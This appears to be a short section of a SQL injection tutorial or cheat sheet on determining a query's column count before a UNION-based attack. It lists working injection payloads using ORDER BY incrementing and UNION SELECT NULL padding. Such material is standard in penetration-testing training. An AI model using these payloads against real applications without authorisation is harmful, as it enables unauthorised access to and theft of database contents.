## 2. Determining Column Count
To use `UNION SELECT`, the number of columns in your payload must match the original query.

### Method 1: ORDER BY
Increment the number until the application throws an error.
*   `' ORDER BY 1-- -`
*   `' ORDER BY 5-- -` (Keep incrementing until it breaks)

### Method 2: UNION SELECT NULL
Increment the `NULL` values until the page loads successfully.
*   `' UNION SELECT NULL-- -`
*   `' UNION SELECT NULL, NULL, NULL-- -`

